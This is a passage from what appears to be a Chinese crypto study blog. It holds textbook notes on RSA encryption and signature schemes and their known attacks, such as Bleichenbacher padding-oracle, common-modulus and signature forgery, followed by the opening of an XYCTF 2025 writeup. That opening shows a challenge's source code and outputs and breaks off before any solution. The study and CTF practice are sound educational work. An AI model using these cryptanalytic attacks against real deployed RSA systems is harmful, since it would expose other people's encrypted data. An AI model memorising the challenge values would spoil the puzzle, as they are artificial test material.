title="12.5基于RSA的加密"></a>12.5基于RSA的加密</h2><h3 id="12-5-1-普通RSA加密"><a href="#12-5-1-普通RSA加密" class="headerlink" title="12.5.1 普通RSA加密"></a>12.5.1 普通RSA加密</h3><h4 id="普通RSA中的更多攻击"><a href="#普通RSA中的更多攻击" class="headerlink" title="普通RSA中的更多攻击"></a>普通RSA中的更多攻击</h4><ul><li>m恢复效率提升两倍<br><strong>明文分解</strong>：假设$m$是一个均匀的$n$位整数，那么对于适当的$α≈\frac 12$​，可以证明以高概率存在整数$r$和$s$，使得$1&lt;r≤s≤2^{αn}$且$m&#x3D;rs$</li></ul><p><strong>攻击过程</strong>：<br>1.计算$x_r​&#x3D;cr^{−e} \mod N$，这实际上是将密文$c$除以$r^e$。<br>2.如果存在某个$s$使得$s^e\mod N&#x3D;x_r$​，则$m&#x3D;r⋅s$。<br>3.通过排序和二分查找，可以在$O(T)$的时间内找到这样的$r$和$s$</p><ul><li>小e加密</li><li>m部分已知</li><li>加密相关消息</li><li>向多个接收者发送相同消息</li></ul><blockquote><p>这部分内容可以看我博客CTF RSA题型</p></blockquote><h3 id="12-5-2-Padded-RSA-和-PKCS-1-v1-5"><a href="#12-5-2-Padded-RSA-和-PKCS-1-v1-5" class="headerlink" title="12.5.2 Padded RSA 和 PKCS#1 v1.5"></a>12.5.2 Padded RSA 和 PKCS#1 v1.5</h3><p><strong>随机填充的作用</strong>：随机填充$r$使得加密过程不再是确定性的，从而提高了安全性</p><h4 id="RSA-PKCS-1-v1-5"><a href="#RSA-PKCS-1-v1-5" class="headerlink" title="RSA  PKCS#1 v1.5"></a>RSA  PKCS#1 v1.5</h4><p><strong>消息长度：</strong> 消息$m$的长度为$D$字节，其中$1\leq D\leq k-11$，$k$是$N$的字节长度<br><strong>加密过程：</strong></p><ul><li>选择一个长为$k-D-3$字节的随机填充$r$，且$r$中没有字节等于0x00</li><li>填充后的消息$p&#x3D;0x00||0x02||r||0x00||m$</li><li>计算密文$c&#x3D;p^e\mod N$</li></ul><p><strong>缺陷：</strong><br>填充长度可能太短，攻击者可通过暴力攻击恢复部分明文</p><h3 id="12-5-3-无随机预言的CPA安全加密"><a href="#12-5-3-无随机预言的CPA安全加密" class="headerlink" title="12.5.3 无随机预言的CPA安全加密"></a>12.5.3 无随机预言的CPA安全加密</h3><blockquote><p>本小节只进行理论上的讨论，因为实际中有更高效的构造方案</p></blockquote><h4 id="RSA问题的硬核谓词"><a href="#RSA问题的硬核谓词" class="headerlink" title="RSA问题的硬核谓词"></a>RSA问题的硬核谓词</h4><p><strong>定义</strong>：硬核谓词是一种从单向函数的输出中难以计算的特定信息。对于RSA问题，最小有效位（lsb）被证明是一个硬核谓词。</p><h4 id="构建KEM"><a href="#构建KEM" class="headerlink" title="构建KEM"></a>构建KEM</h4><p><strong>目标</strong>：扩展单比特加密方案，生成一个长度为$n$的密钥。<br><strong>方法</strong>：通过重复应用RSA置换（即模$N$下的$e$次幂运算），从一个初始随机值$c_1​$开始，依次计算$c_1^e \mod N$，$(c_1^e​)^e\mod N$，直到$c_1^{e^n} \mod N$。最终的密文是$c_{n+1}$​，而密钥则是由这些中间值的最小有效位组成的序列。<br><strong>解密过程</strong>：接收方使用私钥$d_0​&#x3D;[d^n\mod ϕ(N)]$反向计算，恢复初始值$c_1$​，并从中提取密钥。<br><strong>定理12.35</strong>：如果RSA问题是困难的，那么该构建是一个CPA安全的KEM</p><h4 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h4><p><strong>加密</strong>：需要$2n$次模$N$的乘法。<br><strong>解密</strong>：需要一次完整的模$N$指数运算（大约3072次模$N$的乘法）加上额外的$2n$次模$N$的乘法。</p><h3 id="12-5-4-OAEP-and-PKCS-1-v2"><a href="#12-5-4-OAEP-and-PKCS-1-v2" class="headerlink" title="12.5.4 OAEP and PKCS #1 v2"></a>12.5.4 OAEP and PKCS #1 v2</h3><h4 id="普通RSA加密"><a href="#普通RSA加密" class="headerlink" title="普通RSA加密"></a>普通RSA加密</h4><p>纯RSA加密连CPA安全都无法保证，因为它是一个确定性加密方案。</p><h4 id="RSA-PKCS-1-v1-5-1"><a href="#RSA-PKCS-1-v1-5-1" class="headerlink" title="RSA PKCS #1 v1.5"></a>RSA PKCS #1 v1.5</h4><p>PKCS #1 v1.5存在一种更实用的CCA攻击，攻击者不需要完整的解密预言机，只需要一个“部分”解密预言机，该预言机指示解密是否成功。这种攻击利用了PKCS #1 v1.5在解密时对填充格式的检查。</p><p>Bleichenbacher攻击：攻击者通过选择随机的$s∈Z_N^∗​$并提交$c′&#x3D;[s^e⋅c\mod N]$给解密者，利用解密者的响应来逐步恢复明文$m$。</p><h4 id="RSA-OAEP构建"><a href="#RSA-OAEP构建" class="headerlink" title="RSA-OAEP构建"></a>RSA-OAEP构建</h4><p><strong>Gen：</strong></p><ul><li>输入安全参数$1^n$，允许$Gen(1^n)$，得到公钥$(N,e)$和私钥$(N,d)$</li><li>输出公钥$pk&#x3D;(N,e)$和私钥$sk&#x3D;(N,d)$</li></ul><p><strong>Enc：</strong></p><ul><li>输入公钥$pk&#x3D;(N,e)$和消息$m\in {0,1}^l$</li><li>设置$m_0:&#x3D;m||0^k$（即在$m$后加$k$个0）</li><li>随机选择$r\in {0,1}^k$</li><li>计算$t:&#x3D;m_0 \oplus G(r)$和$s:&#x3D;r\oplus H(t)$</li><li>设置$m_1:&#x3D;s||t$</li><li>输出密文$c:&#x3D;[m_1^e \mod N]$</li></ul><p><strong>Dec：</strong></p><ul><li>输入私钥$sk&#x3D;(N,d)$和密文$c\in Z_N^*$</li><li>计算$m_1:&#x3D;[c^d \mod N]$</li><li>解析$m_1$为$s||t$</li><li>计算$r:&#x3D;H(t)\oplus s$和$m_0:&#x3D;G(r)\oplus t$</li><li>检查$m_0$的最后$k$位是否全为0，如果不是，返回错误</li><li>否则丢弃$m_0$的最后$k$个0，输出剩余的$l$位作为消息$m$</li></ul><h4 id="Manger’s-CPA-on-PKCS-1-v2-0"><a href="#Manger’s-CPA-on-PKCS-1-v2-0" class="headerlink" title="Manger’s CPA on PKCS #1 v2.0."></a>Manger’s CPA on PKCS #1 v2.0.</h4><p><strong>Manger攻击</strong>：2001年，James Manger发现了一种针对PKCS #1 v2.0的CCA攻击，即使PKCS #1 v2.0是RSA-OAEP的一个变体。这种攻击利用了某些实现中返回不同错误信息的问题。</p><h3 id="12-5-5-随机预言模型中CCA安全的KEM"><a href="#12-5-5-随机预言模型中CCA安全的KEM" class="headerlink" title="12.5.5 随机预言模型中CCA安全的KEM"></a>12.5.5 随机预言模型中CCA安全的KEM</h3><p><strong>构造</strong></p><p><strong>Gen</strong></p><ul><li>输入安全参数$1^n$。</li><li>运行RSA密钥生成算法$GenRSA(1^n)$，得到公钥$(N,e)$和私钥$(N,d)$。</li><li>定义一个函数$H:Z_N^∗​→{0,1}^n$，该函数在分析中被建模为随机预言。</li></ul><p><strong>Encaps</strong></p><ul><li>输入公钥$pk&#x3D;(N,e)$。</li><li>随机选择$r∈Z_N^∗$​。</li><li>计算密文$c:&#x3D;[r^e\mod N]$和密钥$k:&#x3D;H(r)$。</li><li>输出密文$c$和密钥$k$。</li></ul><p><strong>Decaps</strong></p><ul><li>输入私钥$sk&#x3D;(N,d)$和密文$c∈Z_N^∗$​。</li><li>计算$r:&#x3D;[c^d\mod N]$。</li><li>输出密钥$k:&#x3D;H(r)$。</li></ul><p><strong>安全性：</strong><br>在CCA攻击中，攻击者可以查询解封装预言机（Decapsulation Oracle），但这些查询不会泄露关于密钥$H(r)$的任何额外信息。<br>解封装预言机的查询只会返回$(H)(\bar r)$，其中$\bar r&#x3D;[\bar c^d\mod N]$。如果$\bar c&#x3D;c$，则$\bar r&#x3D;r$，但$H(r)$仍然是随机的，因为$H$是随机预言。<br>因此，即使攻击者可以查询解封装预言机，也无法区分挑战密文所封装的密钥$k$和一个随机密钥。</p><h3 id="12-5-6-RSA的实现问题和陷阱"><a href="#12-5-6-RSA的实现问题和陷阱" class="headerlink" title="12.5.6 RSA的实现问题和陷阱"></a>12.5.6 RSA的实现问题和陷阱</h3><h4 id="使用CRT时的故障攻击"><a href="#使用CRT时的故障攻击" class="headerlink" title="使用CRT时的故障攻击"></a>使用CRT时的故障攻击</h4><p>如果在计算过程中发生错误（例如，攻击者通过硬件篡改诱导错误），可能会导致安全问题。</p><h4 id="依赖公钥I"><a href="#依赖公钥I" class="headerlink" title="依赖公钥I"></a>依赖公钥I</h4><ul><li><strong>问题</strong>：多个接收者使用相同的模数$N$，但不同的公钥指数$e_i$和私钥指数$d_i$​。</li><li><strong>攻击</strong>：给定$N$和$e_i​⋅d_i​&#x3D;1\mod ϕ(N)$，可以高效地分$N$。一旦分解了$N$，就可以计算任何$e_j​$的逆元$d_j$​。</li><li><strong>后果</strong>：任何员工都可以读取发送给其他员工的加密消息。</li></ul><h4 id="依赖公钥II"><a href="#依赖公钥II" class="headerlink" title="依赖公钥II"></a>依赖公钥II</h4><ul><li><strong>问题</strong>：即使所有员工相互信任，共享模数$N$仍然不安全。</li><li><strong>攻击</strong>：假设相同的明文$m$被加密并发送给两个员工，其公钥分别为$(N,e_1​)$和$(N,e_2​)$，且$gcd(e_1​,e_2​)&#x3D;1$</li><li><strong>攻击方法</strong>：攻击者可以看到两个密文$c_1​&#x3D;m^{e_1}​\mod N$和$c_2​&#x3D;m^{e_2}​\mod N$。利用扩展欧几里得算法计算整数$X$和$Y$，使得$Xe_1​+Ye_2​&#x3D;1$。那么$m&#x3D;[c_1^X​⋅c_2^Y​\mod N]$。</li><li><strong>后果</strong>：攻击者可以轻松恢复明文$m$</li></ul><h1 id="13-数据签名方案"><a href="#13-数据签名方案" class="headerlink" title="13.数据签名方案"></a>13.数据签名方案</h1><h2 id="13-1-概述"><a href="#13-1-概述" class="headerlink" title="13.1 概述"></a>13.1 概述</h2><p>数字签名是一种公钥密码学工具，允许签名者$S$使用其私钥$sk$对消息$m$进行签名，生成签名$σ$。任何知道签名者公钥$pk$的人都可以验证签名的合法性，从而确认消息确实由签名者生成且未被篡改。</p><h3 id="与MAC的比较"><a href="#与MAC的比较" class="headerlink" title="与MAC的比较"></a>与MAC的比较</h3><p><strong>MAC局限性：</strong> 无法实现公开验证、不可抵赖性 和签名的可转移性。<br><strong>数字签名优势：</strong></p><ul><li><strong>公开验证</strong>：任何知道公钥的人都可以验证签名。</li><li><strong>不可抵赖性</strong>：签名者无法否认自己对消息的签名。</li><li><strong>可转移性</strong>：签名可以被第三方验证，并可进一步传递给其他方。</li></ul><h3 id="与公钥加密的联系"><a href="#与公钥加密的联系" class="headerlink" title="与公钥加密的联系"></a>与公钥加密的联系</h3><p><strong>误解</strong>：数字签名有时被错误地视为公钥加密的“逆操作”，即通过私钥解密消息来生成签名，通过公钥加密签名来验证。这种观点是错误的，因为：</p><ul><li><strong>不适用性</strong>：在大多数情况下，这种方法根本不可行。</li><li><strong>不安全性</strong>：即使在可以应用的情况下，生成的签名方案也不安全。<br><strong>正确关系</strong>：数字签名和公钥加密是两种不同的密码学原语，尽管它们都基于公钥密码学，但它们的设计和安全性要求不同。</li></ul><h2 id="13-2定义"><a href="#13-2定义" class="headerlink" title="13.2定义"></a>13.2定义</h2><h3 id="签名方案的安全性"><a href="#签名方案的安全性" class="headerlink" title="签名方案的安全性"></a>签名方案的安全性</h3><p>数字签名方案的安全性要求攻击者无法伪造签名，即使它已经获得了许多其他消息的签名。</p><h2 id="13-3-hash签名方案"><a href="#13-3-hash签名方案" class="headerlink" title="13.3 hash签名方案"></a>13.3 hash签名方案</h2><p><strong>构造：</strong><br>假设我们有一个签名方案$Π&#x3D;(Gen,Sign,Vrfy)$，它适用于长度为$ℓ(n)$的消息，以及一个哈希函数 $Π_H​&#x3D;(Gen_H​,H)$，其输出长度为 ℓ(n)。我们构造一个新的签名方案$Π′&#x3D;(Gen′,Sign′,Vrfy′)$，如下所示：</p><p><strong>Gen’：</strong></p><ul><li>输入：安全参数$1^n$。</li><li>运行$Gen(1^n)$生成密钥对$(pk,sk)$。</li><li>运行$Gen_H​(1^n)$生成哈希函数的参数$s$。</li><li>公钥为$⟨pk,s⟩$，私钥为$⟨sk,s⟩$。</li></ul><p><strong>Sign‘：</strong></p><ul><li>输入：私钥$⟨sk,s⟩$和消息$m∈{0,1}^∗$。</li><li>计算哈希值$H_s​(m)$。</li><li>使用私钥$sk$对哈希值$H_s​(m)$进行签名，得到签名$σ←Sign_{sk}​(H_s​(m))$</li><li>输出签名$σ$。</li></ul><p><strong>Vrfy’</strong></p><ul><li>输入：公钥$⟨pk,s⟩$、消息$m∈{0,1}^∗$和签名$σ$。</li><li>计算哈希值$H_s​(m)$。</li><li>使用公钥$pk$验证签名$σ$是否是$Hs​(m)$的有效签名，即检查$Vrfy_{pk}​(H_s​(m),σ)&#x3D;1$。</li><li>如果验证通过，输出1（有效）；否则输出0（无效）。</li></ul><p><strong>定理13.4</strong>：如果$Π$是一个安全的签名方案（适用于长度为 ℓ 的消息），并且$Π_H$是抗碰撞性的，那么上面构造就是一个安全的签名方案（适用于任意长度的消息）</p><h2 id="13-4-基于RSA的签名"><a href="#13-4-基于RSA的签名" class="headerlink" title="13.4 基于RSA的签名"></a>13.4 基于RSA的签名</h2><h3 id="13-4-1普通RSA签名"><a href="#13-4-1普通RSA签名" class="headerlink" title="13.4.1普通RSA签名"></a>13.4.1普通RSA签名</h3><h4 id="无消息攻击"><a href="#无消息攻击" class="headerlink" title="无消息攻击"></a>无消息攻击</h4><p>攻击者可以选择一个随机的$σ∈Z_N^∗$​，计算$m:&#x3D;[σ^e\mod N]$，然后输出伪造的签名对$(m,σ)$。这种攻击是有效的，因为$σ$是$m$的有效签名。</p><h4 id="任意消息上的签名"><a href="#任意消息上的签名" class="headerlink" title="任意消息上的签名"></a>任意消息上的签名</h4><p>攻击者可以选择两个消息$m_1​,m_2​∈Z_N^∗$​，使得$m&#x3D;m_1​⋅m_2 \mod N$。然后获取$m_1​$和$m_2​$的签名$σ1​,σ2$​，并输出$σ:&#x3D;[σ_1​⋅σ_2 \mod N]$作为$m$的签名。这种攻击也是有效的，因为：<br>$σ^e&#x3D;(σ^1​⋅σ_2​)^e&#x3D;(m_1^d​⋅m_2^d​)^e&#x3D;m_1​⋅m_2​&#x3D;m\mod N$</p><h3 id="13-4-2-RSA-FDH-和PKCS-1标准"><a href="#13-4-2-RSA-FDH-和PKCS-1标准" class="headerlink" title="13.4.2 RSA-FDH 和PKCS #1标准"></a>13.4.2 RSA-FDH 和PKCS #1标准</h3><p><strong>构造：</strong><br><strong>Gen</strong>：</p><ul><li>输入安全参数$1^n$。    </li><li>运行$GenRSA(1^n)$生成模数$N$和整数$e,d$，满足$ed&#x3D;1modϕ(N)$。 </li><li>公钥为$pk&#x3D;(N,e)$，私钥为$sk&#x3D;(N,d)$。</li><li>定义一个函数$H:{0,1}∗→Z_N^∗​$</li></ul><p><strong>Sign</strong>：</p><ul><li>输入私钥$sk&#x3D;(N,d)$和消息$m∈{0,1}^∗$。    </li><li>计算签名$σ:&#x3D;[H(m)^d\mod N]$。</li></ul><p><strong>Vrfy</strong>：</p><ul><li>输入公钥$pk&#x3D;(N,e)$、消息$m$和签名$σ$。 </li><li>验证是否$σ^e&#x3D;H(m)\mod N$</li></ul><h4 id="RSA-PKCS-1标准"><a href="#RSA-PKCS-1标准" class="headerlink" title="RSA PKCS #1标准"></a>RSA PKCS #1标准</h4><ul><li><strong>PKCS #1 v1.5</strong>：与RSA-FDH非常相似，但存在一些已知的安全性问题。</li><li><strong>PKCS #1 v2.1</strong>：包含一个更复杂的方案，可以视为RSA-FDH的随机化变体。</li></ul><h2 id="13-5离散对数问题的签名"><a href="#13-5离散对数问题的签名" class="headerlink" title="13.5离散对数问题的签名"></a>13.5离散对数问题的签名</h2><h3 id="13-5-1标识方案和签名"><a href="#13-5-1标识方案和签名" class="headerlink" title="13.5.1标识方案和签名"></a>13.5.1标识方案和签名</h3><h4 id="识别方案"><a href="#识别方案" class="headerlink" title="识别方案"></a>识别方案</h4><p>识别方案是一种交互式协议，允许一方（称为“证明者”）向另一方（称为“验证者”）证明其身份。</p><h4 id="从识别方案到签名"><a href="#从识别方案到签名" class="headerlink" title="从识别方案到签名"></a>从识别方案到签名</h4><p><strong>Fiat-Shamir变换：</strong></p><ul><li><strong>变换方法</strong>：Fiat-Shamir变换可以将任何交互式的识别方案转换为非交互式的签名方案。</li><li><strong>基本思想</strong>：签名者作为证明者，自己运行识别协议。签名者首先计算初始消息$I$，然后通过哈希函数$H$生成挑战$r$，最后计算响应$s$。签名是$(r,s)$</li><li><strong>验证过程</strong>：验证者重新计算 I 并检查$H(I,m)&#x3D;r$。</li></ul><h3 id="13-5-2-Schnorr-身份识别-签名方案"><a href="#13-5-2-Schnorr-身份识别-签名方案" class="headerlink" title="13.5.2 Schnorr 身份识别&#x2F;签名方案"></a>13.5.2 Schnorr 身份识别&#x2F;签名方案</h3><p><strong>构造</strong>：</p><p><strong>Gen</strong>：与识别方案相同。   </p><p><strong>Sign</strong>：    </p><ul><li>选择随机$k∈Z_q​$，计算$I&#x3D;g^k$。</li><li>计算$r&#x3D;H(I,m)$</li><li>计算$s&#x3D;[rx+k\mod q]$。    </li><li>输出签名$(r,s)$。</li></ul><p><strong>Vrfy</strong>：   </p><ul><li>计算$I&#x3D;g^s⋅y^{−r}$。</li><li>检查是否$H(I,m)&#x3D;r$。</li></ul><p><strong>安全性</strong>：如果离散对数问题是困难的，并且哈希函数 H 被建模为随机预言，那么Schnorr签名方案是安全的。</p><h3 id="13-5-3-DSA和ECDSA"><a href="#13-5-3-DSA和ECDSA" class="headerlink" title="13.5.3 DSA和ECDSA"></a>13.5.3 DSA和ECDSA</h3><h4 id="DSA构造"><a href="#DSA构造" class="headerlink" title="DSA构造"></a>DSA构造</h4><p><strong>Gen</strong>：<br>运行$G(1^n)$生成群$G$、阶$q$和生成元$g$。选择随机$x∈Z_q$​，计算$y&#x3D;g^x$。公钥为$(G,q,g,y)$，私钥为$x$。</p><p> <strong>Sign</strong>：   </p><ul><li>选择随机$k∈Z_q^∗$​，计算$r&#x3D;F(g^k)$。   </li><li>计算$s&#x3D;[k^{−1}⋅(H(m)+xr)\mod q]$。</li><li>输出签名$(r,s)$。</li></ul><p><strong>Vrfy</strong>：</p><ul><li>计算$I&#x3D;g^{H(m)⋅s^{−1}}⋅y^{r⋅s^{−1}}$。</li><li>检查是否$r&#x3D;F(I)$</li></ul><h4 id="ECDSA构造"><a href="#ECDSA构造" class="headerlink" title="ECDSA构造"></a>ECDSA构造</h4><p> <strong>Gen</strong>：与DSA相同，但群$G$是椭圆曲线群。</p><p> <strong>Sign</strong>：</p><ul><li>选择随机$k∈Z_q^∗$​，计算$r&#x3D;F(g^k)$。</li><li>计算$s&#x3D;[k^{−1}⋅(H(m)+xr)\mod q]$。    </li><li>输出签名$(r,s)$。</li></ul><p><strong>Vrfy</strong>：   </p><ul><li>计算$I&#x3D;g^{H(m)⋅s^{−1}}⋅y^{r⋅s^{−1}}$。    </li><li>检查是否$r&#x3D;F(I)$。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>密码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF 2025 Writeup</title>
    <link href="/2025/04/16/XYCTF%202025%20Writeup/"/>
    <url>/2025/04/16/XYCTF%202025%20Writeup/</url>
    
    <content type="html"><![CDATA[<p>XYCTF 2025赛题复现</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Complex</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, re, im</span>):<br>        <span class="hljs-variable language_">self</span>.re = re<br>        <span class="hljs-variable language_">self</span>.im = im<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, c</span>):<br>        re_ = <span class="hljs-variable language_">self</span>.re * c.re - <span class="hljs-variable language_">self</span>.im * c.im<br>        im_ = <span class="hljs-variable language_">self</span>.re * c.im + <span class="hljs-variable language_">self</span>.im * c.re<br>        <span class="hljs-keyword">return</span> Complex(re_, im_)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, c</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.re == c.re <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.im == c.im<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__rshift__</span>(<span class="hljs-params">self, m</span>):<br>        <span class="hljs-keyword">return</span> Complex(<span class="hljs-variable language_">self</span>.re &gt;&gt; m, <span class="hljs-variable language_">self</span>.im &gt;&gt; m)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__lshift__</span>(<span class="hljs-params">self, m</span>):<br>        <span class="hljs-keyword">return</span> Complex(<span class="hljs-variable language_">self</span>.re &lt;&lt; m, <span class="hljs-variable language_">self</span>.im &lt;&lt; m)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.im == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-variable language_">self</span>.re)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.re == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(<span class="hljs-variable language_">self</span>.im) == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">if</span> self.im &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>i&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.im&#125;</span>i&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.re&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">if</span> self.im &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;-&#x27;</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-built_in">abs</span>(self.im)&#125;</span>i&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tolist</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable language_">self</span>.re, <span class="hljs-variable language_">self</span>.im]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">complex_pow</span>(<span class="hljs-params">c, exp, n</span>):<br>    result = Complex(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> exp &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> exp &amp; <span class="hljs-number">1</span>:                                             <span class="hljs-comment">#判断是否是奇数</span><br>            result = result * c<br>            result.re = result.re % n<br>            result.im = result.im % n<br>        c = c * c<br>        c.re = c.re % n<br>        c.im = c.im % n<br>        exp &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br>bits = <span class="hljs-number">128</span>                                                      <span class="hljs-comment">#128bits</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>m = Complex(getRandomRange(<span class="hljs-number">1</span>, n), getRandomRange(<span class="hljs-number">1</span>, n))         <span class="hljs-comment">#复数，Complex(re,im)</span><br>e = <span class="hljs-number">3</span><br>c = complex_pow(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;mh = <span class="hljs-subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;C = <span class="hljs-subst">&#123;c.tolist()&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;enc = <span class="hljs-subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="hljs-built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="hljs-string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span><br><span class="hljs-string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span><br><span class="hljs-string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span><br><span class="hljs-string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span><br><span 